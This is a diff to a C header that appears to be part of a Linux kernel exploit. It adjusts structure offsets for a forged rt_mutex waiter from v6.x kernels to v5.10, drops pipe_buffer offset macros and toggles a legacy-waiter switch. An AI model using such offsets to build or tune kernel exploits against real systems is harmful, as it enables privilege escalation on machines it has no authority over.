@@ -236,12 +236,15 @@
  * waiter
  * ========================================================================== */
 
-#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
-#define FAKE_WAITER_TASK_OFF          0x30
-#define FAKE_WAITER_LOCK_OFF          0x38
-#define FAKE_WAITER_PRIO_OFF          0x40
-#define FAKE_WAITER_DEADLINE_OFF      0x48
-#define FAKE_WAITER_LAYOUT_SIZE       0x50
+#define FAKE_WAITER_TREE_PRIO_OFF       0x18
+#define FAKE_WAITER_TREE_DEADLINE_OFF   0x20
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18   /* v5.10: pi_tree_entry at 24 (0x18), NOT 0x28 like v6.x */
+#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x40
+#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
+#define FAKE_WAITER_TASK_OFF            0x30   /* v5.10: task at 0x30 (was 0x50 in v6.x) */
+#define FAKE_WAITER_LOCK_OFF            0x38   /* v5.10: lock at 0x38 (was 0x58 in v6.x) */
+#define FAKE_WAITER_WAKE_STATE_OFF      0x60   /* v5.10: field absent; harmless write past struct */
+#define FAKE_WAITER_WW_CTX_OFF          0x68   /* v5.10: field absent; harmless write past struct */
 
 /* ============================================================================
  * task_struct
@@ -311,21 +314,6 @@
 #define PIPE_BUFFER_SLOTS 32
 #define PIPE_BUF_FLAG_CAN_MERGE 0x10
 
-#define PIPE_BUFFER_PAGE_OFF      0x00
-#define PIPE_BUFFER_OFFSET_OFF    0x08
-#define PIPE_BUFFER_LEN_OFF       0x0c
-#define PIPE_BUFFER_OPS_OFF       0x10
-#define PIPE_BUFFER_FLAGS_OFF     0x18
-#define PIPE_BUFFER_PRIVATE_OFF   0x20
-#define PIPE_BUFS_OFF 0xa0
-
-#define PIPE_FIELD_60_OFF 0x60
-#define PIPE_FIELD_64_OFF 0x64
-#define PIPE_FIELD_68_OFF 0x68
-#define PIPE_FIELD_6C_OFF 0x6c
-#define PIPE_FIELD_74_OFF 0x74
-#define PIPE_FIELD_78_OFF 0x78
-
 /* ============================================================================
  * file_operations
  * ========================================================================== */
@@ -354,7 +342,7 @@
 
 #define KMALLOC_CGROUP_TYPE 0
 #define KMALLOC_CACHE_TYPES 2
-#define LEGACY_RT_MUTEX_WAITER 1
+// #define LEGACY_RT_MUTEX_WAITER 1
 
 /* ============================================================================
  * Convenience macros
